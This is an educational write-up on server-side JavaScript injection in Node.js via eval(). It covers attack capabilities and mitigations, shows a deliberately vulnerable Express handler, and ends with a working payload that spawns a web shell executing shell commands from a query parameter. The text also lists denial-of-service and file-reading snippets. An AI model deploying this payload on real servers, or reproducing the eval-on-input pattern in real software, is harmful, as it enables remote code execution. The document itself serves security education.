# Server Side Javascript Injection (SSJS) Write Up {-}

# Description
This type of attack occurs when unsanitized user submitted data is parsed with an evaluative JS function on the server, i.e. `eval()`. This allows for arbitrary code execution which is highly invasive and potentially damaging to the server.

**Note:** Such vulnerabilities exist in `setInterval()`, `setTimeout()`, and `Function()`, however Node.js uses modified variations of these, limiting their input types to callback functions only, as opposed to strings. This effectively mitigates the vulnerability through these functions on Node servers, however other Javascript runtimes may be susceptible to attack.
>This function is similar to `window.setTimeout()` (as well as `window.setInterval()`) from the browser JavaScript API, however a string of code cannot be passed to be executed. _-Node.js documentation_



# Capabilities
This exploit allows an attacker to control code execution of the server. This gives the attacker the same permissions as that of the server. Possible attacks include:
- **Denial of Service**
  - `while(1)`
    - Targets server's event loop rendering it unable to process any other requests.
  - `process.exit()` or `process.kill(process.pid)`
    - Exits or kills the process, resulting in a DoS

- **File System Access**
  - `require('fs').readdirSync('.')`
    - Reads the directory of the application
  - `require('fs').readFile(<some file path>)`
    - Reads content of file on the server's system
- **Execution of Binary Files**
  - `require('child_process').execSync("<some command>")`
    - Opens a shell and executes a command

# Limitations
Because the attack allows for code execution by the server, the attacker has the permissions of the server application. If a shell is opened, the permissions of the current user will be transferred.

# Mitigations

## Application level
- Properly validate/sanitize all user input
  - If submitting user input into dynamically evaluated code is unavoidable, input should be limited ideally to a whitelist of accepted inputs, or at least restricted to a short string of alphanumeric characters.
- Avoid use of `eval()` to parse user input
  - Use parsers such as `parseInt()` to safely evaluate output
- Include `'use strict'` when possible to limit permissions of the application
  - Prevents eval from being able to create variables in the scope it was called in
  - Requiring that strict mode be enabled on user submitted Javascript eliminates the purpose for some runtime checks, minimizing performance cost.


## System level
Restriction of user permissions on the server will limit the impact of malicious code on the system.

# Examples

## Using `eval()`

### Dependencies
Install the following npm packages:
- `express`: framework used to build the vulnerable web app, not vulnerable itself.

### Exploitable source
### [`exploitable.js`](https://github.uconn.edu/jrs12014/OSC-UConn/tree/master/WriteUps/JSCodeInjections/examples/eval/exploitable.js)

Uses the `eval` builtin as an integer parser for the `birthYear` POST query. This is available at the `<exploitable server>/` route.

```javascript
//Handles form submissions
app.post('/', (req, res) => {
  //Retrieve query from form
  let birthYear = eval(req.body.birthYear)

  //End HTTP response
  res.end("You are " + (2019 - birthYear) + " years old.")
});
```

### Running the Exploit
#### Starting server
After downloading the source and installing the dependencies you can run the server by doing:

- `foo@bar:~$ cd /path/to/base_packages/`
- `foo@bar:~$ node exploitable.js`

#### Payload Procedure

- Go to `localhost:8080/` or whatever port server is hosted on
- Form on webpage serves the exploit using `eval` function

#### Example Payload
```javascript
setTimeout(function() {
    require('http').createServer(function(req, res) {
        res.writeHead(200, {
            "Content-Type": "text/plain"
        });
        require('child_process').exec(require('url').parse(req.url, true).query['cmd'], function(e, s, st) {
            res.end(s);
        })
    }).listen(8000);
}, 5000)
```
This payload will create a separate web server accessible by `localhost:8000/` and process GET requests via the `cmd` query to execute those as commands on the shell of the server's system.

# Searching for Vulnerability
This vulnerability can be found wherever a string or object from user input is parsed into Javascript and executed, such as through the `eval()` function.
